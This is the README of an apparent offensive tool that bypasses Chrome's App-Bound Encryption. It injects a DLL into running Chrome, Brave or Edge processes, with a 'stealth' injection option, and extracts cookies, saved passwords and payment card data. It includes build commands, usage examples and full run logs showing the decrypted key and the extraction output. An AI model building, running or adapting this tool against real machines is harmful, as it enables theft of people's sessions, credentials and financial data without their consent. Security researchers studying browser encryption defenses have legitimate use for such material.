# Chrome App-Bound Encryption Decryption

> **Purpose**  
> Decrypt the **App‑Bound Encrypted (ABE)** keys stored in the *Local State* file of Chromium‑based browsers (**Chrome, Brave, Edge**) **without requiring administrative privileges**.

Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service *and* when the calling binary is inside the browser’s installation directory.

This project bypasses that path‑validation requirement by injecting a small DLL into the running browser process and calling IElevator from there, supporting multiple injection methods, verbose debugging, auto‑start, and optional process cleanup and cookie extraction.

<img width="929" alt="Chrome-App-Bound-Encryption-Decryption-4" src="https://github.com/user-attachments/assets/31f852b1-39b8-4aea-a2a2-e17aa7770ce3" />


## 📦 Supported & Tested Versions

| Browser | Tested Version (x64 & ARM64) |
|---------|-----------------------------|
| **Google Chrome** | 136.0.7103.93 |
| **Brave** | 1.78.94 (136.0.7103.60) |
| **Microsoft Edge** | 136.0.3240.50  |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

1. **Clone** the repository and open a *Developer Command Prompt for VS* (or any MSVC‑enabled shell).  
2. **Compile the DLL** (responsible for the decryption logic):

    ```bash
    cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
    ```
3. **Compile the injector** (responsible for DLL injection & console UX):

    ```bash
    cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
    ```

Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.

## 🚀 Usage

```bash
PS> .\chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--method load|nt`
  Injection method:
  - load = CreateRemoteThread + LoadLibrary (default)
  - nt   = NtCreateThreadEx stealth injection

- `--start-browser`
  Auto-launch the browser if it’s not already running.

- `--verbose`
  Enable extensive debugging output.

### Examples

```bash
# Standard load-library injection:
PS> .\chrome_inject.exe chrome

# Use stealth NtCreateThreadEx method:
PS> .\chrome_inject.exe --method nt chrome

# Auto-start Brave and show debug logs:
PS> .\chrome_inject.exe --method load --start-browser --verbose brave
```

#### Normal Run

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Cookies / Passwords / Payment Methods       |
|  v0.6 by @xaitax                             |
------------------------------------------------

[*] Chrome not running, launching...
[+] Chrome (v. 136.0.7103.93) launched w/ PID 16768
[+] DLL injected via NtCreateThreadEx stealth
[*] Starting Chrome App-Bound Encryption Decryption process.

[+] COM library initialized.
[+] IElevator instance created successfully.
[+] Proxy blanket set successfully.
[+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding (1224 bytes).
[+] Key header is valid.
[+] Encrypted key blob retrieved (1220 bytes).
[+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
[+] BSTR allocated for encrypted key.
[+] Decryption successful.
[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
[*] 1 payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
[*] Chrome terminated
```


#### Verbose

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt --verbose
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Full Cookie Decryption                      |
|  v0.5 by @xaitax                             |
------------------------------------------------

[#] verbose=true
[#] CleanupPreviousRun: removing temp files
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[#] Target display name=Chrome
[#] procName=chrome.exe, exePath=C:\Program Files\Google\Chrome\Application\chrome.exe
[#] GetProcessIdByName: snapshotting processes
[*] Chrome not running, launching...
[#] StartBrowserAndWait: exe=C:\Program Files\Google\Chrome\Application\chrome.exe
[#] Browser started PID=5152
[#] Retrieving version info
[#] GetFileVersionInfoSizeW returned size=2212
[+] Chrome (v. 136.0.7103.49) launched w/ PID 5152
[#] Opening process PID=5152
[#] HandleGuard: acquired handle 228
[#] GetDllPath: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] InjectWithNtCreateThreadEx: begin
[#] ntdll.dll base=140707482173440
[#] NtCreateThreadEx addr=140707482180800
[#] VirtualAllocEx size=87
[#] WriteProcessMemory complete
[#] Calling NtCreateThreadEx
[#] NtCreateThreadEx returned 0, thr=248
[#] InjectWithNtCreateThreadEx: done
[+] DLL injected via NtCreateThreadEx stealth
[*] Starting Chrome App-Bound Encryption Decryption process.
[#] Opening log file C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log

[+] COM library initialized.
[+] IElevator instance created successfully.
[+] Proxy blanket set successfully.
[+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding (1224 bytes).
[+] Key header is valid.
[+] Encrypted key blob retrieved (1220 bytes).
[+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
[+] BSTR allocated for encrypted key.
[+] Decryption successful.
[+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 114 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[#] Terminating browser PID=5152
[#] HandleGuard: acquired handle 252
[*] Chrome terminated
[#] HandleGuard: closing handle 252
[#] Exiting, success
[#] HandleGuard: closing handle 228
```

## 🍪 Cookie Extraction

Once decryption completes, all cookies are emitted in JSON format into your Temp folder:

- `%TEMP%\<Browser>_decrypt_cookies.txt`  

Each file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

## 🆕 v0.6 Changelog

- **New**: Full Username & Password extraction
- **New**: Full Payment Information (e.g., Credit Card) extraction

## 🆕 v0.5 Changelog

- **New**: Full Cookie extraction into JSON format 

## 🆕 v0.4 Changelog

- **New**: selectable injection methods (`--method load|nt`)  
- **New**: auto‑start the browser if not running (`--start-browser`)  
- **New**: verbose debug output (`--verbose`)  
- **New**: automatically terminate the browser after decryption 
- **Improved**: Injector code refactoring 


Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## Disclaimer

> [!WARNING]  
> This tool is intended for cybersecurity research and educational purposes. Ensure compliance with all relevant legal and ethical guidelines when using this tool.
